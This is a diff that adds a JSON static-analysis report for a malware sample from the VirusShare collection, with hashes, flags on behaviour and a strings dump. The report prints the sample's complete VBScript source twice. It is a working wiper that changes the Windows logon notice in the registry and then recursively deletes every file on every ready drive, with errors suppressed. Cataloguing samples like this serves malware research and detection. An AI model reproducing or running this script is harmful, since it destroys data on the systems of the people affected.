@@ -1,0 +1,66 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "' Coded by Nr@ziz http://www.nraziz.tk\n'cyberghost4@hotmail.com\n\n'Save this file as \"filename.vbs\" \n\non error resume next\n\nDim fsys,Drives,drive,folder,files,subfolder,subfolders\nDim regedit\nset regedit=CreateObject(\"WScript.Shell\")\nregedit.regWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon\\LegalNoticeCaption\",\"Legends of Nr-Bio-Labs\"\nregedit.regWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon\\LegalNoticeText\",\"Wellcome to your Brand New Window :D\"\n\nset fsys=createObjecT(\"Scripting.FileSystemObject\")\nset Drives=fsys.Drives\nfor each drive in Drives\nif drive.isready then\nsearchIt(drive)\nend if\nnext\n\nFunction searchIt(path)\nset Folder=fsys.getFolder(path)\nset files=folder.Files\nfor each file in files\nfile.delete\nnext\n\nset subfolders=folder.subfolders\nfor each subfolder in subfolders\nsearchIt(subFolder.path)\nnext\nend function\n'Thanks to VXBioLabs AcidCookie"
+    },
+    "filename": "VirusShare_aa2eb850a1fa5766936317a51b7d004b",
+    "filesize": 957,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "aa2eb850a1fa5766936317a51b7d004b",
+        "sha1": "a9efa4b0f3004b59d2ec9a91530be177ad8fe55f",
+        "sha256": "a9c6bf01c62b38f059a992ca2fa3102e56db1d4b2749456edbd8d7ac6f14dfb9"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "' Coded by Nr@ziz http://www.nraziz.tk",
+            "'cyberghost4@hotmail.com",
+            "'Save this file as \"filename.vbs\" ",
+            "on error resume next",
+            "Dim fsys,Drives,drive,folder,files,subfolder,subfolders",
+            "Dim regedit",
+            "set regedit=CreateObject(\"WScript.Shell\")",
+            "regedit.regWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon\\LegalNoticeCaption\",\"Legends of Nr-Bio-Labs\"",
+            "regedit.regWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon\\LegalNoticeText\",\"Wellcome to your Brand New Window :D\"",
+            "set fsys=createObjecT(\"Scripting.FileSystemObject\")",
+            "set Drives=fsys.Drives",
+            "for each drive in Drives",
+            "if drive.isready then",
+            "searchIt(drive)",
+            "end if",
+            "next",
+            "Function searchIt(path)",
+            "set Folder=fsys.getFolder(path)",
+            "set files=folder.Files",
+            "for each file in files",
+            "file.delete",
+            "next",
+            "set subfolders=folder.subfolders",
+            "for each subfolder in subfolders",
+            "searchIt(subFolder.path)",
+            "next",
+            "end function",
+            "'Thanks to VXBioLabs AcidCookie"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.nraziz.tk"
+        ]
+    },
+    "time": "0:00:00.282561",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
